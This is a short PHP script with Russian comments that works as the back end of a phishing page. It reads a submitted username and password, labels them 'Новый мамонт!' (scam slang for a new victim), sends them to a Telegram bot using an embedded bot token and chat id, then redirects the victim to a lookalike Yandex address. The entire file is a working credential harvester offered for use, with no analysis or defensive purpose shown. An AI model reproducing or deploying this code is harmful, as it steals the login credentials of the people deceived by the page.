<?php

error_reporting(E_ALL);
ini_set('display_errors', 1);

$username = $_POST['username'];
$password = $_POST['password'];
$token = "6951699342:AAFlpdXN_Ry1pkAap79NQFqpngwX6K0qTS4";
$chat_id = "-1002013267876"; // Новый идентификатор супергруппы

// Создаем текст сообщения
$arr = array(
  'Новый мамонт!',
  'Логин: ' . $username,
  'Пароль: ' . $password,
);

$txt = implode("\n", $arr);

// Кодируем текст для URL
$txt = rawurlencode($txt);

// Формируем URL для запроса
$url = "https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=HTML&text={$txt}";

// Инициализируем cURL
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

// Отправляем запрос и получаем ответ
$response = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);

// Обрабатываем ответ
if ($http_code != 200) {
  echo "Error: Failed to send message. HTTP Code: " . $http_code . " Response: " . $response;
} else {
  $response_data = json_decode($response, true);
  if (isset($response_data['ok']) && $response_data['ok']) {
    header('Location: https://yandex-karta-ip.ru/krYUoYdwJgQEAEQFtofXhydXhnZA=sat&ll=531502572C52434567&z');
  } else {
    echo "Error: " . $response_data['description'];
  }
}

// Закрываем cURL
curl_close($ch);
?>
